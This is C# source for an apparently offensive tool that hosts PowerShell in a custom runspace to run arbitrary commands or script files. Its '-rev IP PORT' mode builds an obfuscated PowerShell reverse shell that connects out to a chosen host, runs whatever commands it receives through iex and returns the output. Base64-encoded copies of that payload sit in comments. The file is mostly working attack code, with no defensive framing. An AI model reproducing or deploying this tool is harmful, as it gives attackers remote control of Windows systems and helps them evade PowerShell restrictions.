using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management;
using System.IO;
using System.Collections.ObjectModel;
using System.Collections.Generic;
using System.Threading;

namespace Runspaces2
{
    class Program
    {
        
        static void Main(string[] args)
        {
            try
            {
                int length = args.Length;
                RunspaceConfiguration rc = RunspaceConfiguration.Create();

                Runspace r = RunspaceFactory.CreateRunspace(rc);
                r.Open();
                PowerShell pshell = PowerShell.Create();
                string cmd;

                if (length == 0)
                {
                    Console.WriteLine("Help Menu");
                    Console.WriteLine("file.exe command_here");
                    Console.WriteLine("file.exe -f file.ps1");
                    Console.WriteLine("file.exe -rev IP PORT");
                    Environment.Exit(0);
                }
                if (length > 1)
                {
                    if (args[0] == "-rev")
                    {

                        string ip = Convert.ToBase64String(Encoding.Unicode.GetBytes(args[1]));
                        string port = args[2];
                        //string @p1 = Encoding.Unicode.GetString(Convert.FromBase64String("JAB7AC8APQBcAC8AXABfAC8AXAAvAFwALwBcAF8ALwA9AFwAXwB9ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgA"));
                        // string @p2 = Encoding.Unicode.GetString(Convert.FromBase64String("KQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"));

                        string p1 = @"${/=\/\_/\/\/\_/=\_} = New-Object System.Net.Sockets.TCPClient(";
                        string p2 = @");${__/=\/\/=\_/\_/\_} = ${/=\/\_/\/\/\_/=\_}.GetStream();[byte[]]${/=\/\__/\___/===\} = 0..65535|%{0};while((${/====\/==\/==\___} = ${__/=\/\/=\_/\_/\_}.Read(${/=\/\__/\___/===\}, 0, ${/=\/\__/\___/===\}.Length)) -ne 0){;${/==\___/====\/\_/} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${/=\/\__/\___/===\},0, ${/====\/==\/==\___});${/==\___/\/=\_/\_/} = (iex ${/==\___/====\/\_/} 2>&1 | Out-String );${/===\/\_/\__/=\_/} = ${/==\___/\/=\_/\_/} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (pwd).Path + '> ';${__/\_/===\/===\__} = ([text.encoding]::ASCII).GetBytes(${/===\/\_/\__/=\_/});${__/=\/\/=\_/\_/\_}.Write(${__/\_/===\/===\__},0,${__/\_/===\/===\__}.Length);${__/=\/\/=\_/\_/\_}.Flush()};${/=\/\_/\/\/\_/=\_}.Close()";

                        cmd = p1 + "'" + Encoding.Unicode.GetString(Convert.FromBase64String(ip)) + "'";
                        cmd += "," + port + p2;
                    }
                    else if (args[0] == "-f")
                    {
                        cmd = File.ReadAllText(args[1]);
                        //Console.WriteLine(cmd);
                    }
                    else
                    {
                        cmd = String.Join(" ", args);
                    }
                }
                else
                {
                    cmd = String.Join(" ", args);

                }
                //string cmd = File.ReadAllText(args[0]);
                //string cmd = @"import-module powerview.ps1;get-help > C:\Users\stargirl\Desktop\tmp1.txt";
                //string cmd = String.Join(" ", args);
                //Console.WriteLine(cmd);
                //string[] cmdlets = cmd.Split(';');
                //Console.WriteLine(cmd);
                //string cmd = "whoami";
                pshell.AddScript(cmd);
                pshell.Runspace = r;
                Collection<PSObject> po = pshell.Invoke();
                //Thread.Sleep(3000);
                //pshell.AddScript("whoami | out-file 'C:\\Users\\stargirl\\Desktop\\tmp2.txt'");
                // pshell.Invoke();
                foreach (PSObject p in po)
                {
                    Console.WriteLine(p.ToString());
                }
                // Console.WriteLine("Press any key to continue");
                // Console.ReadKey();
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }
            
    }
}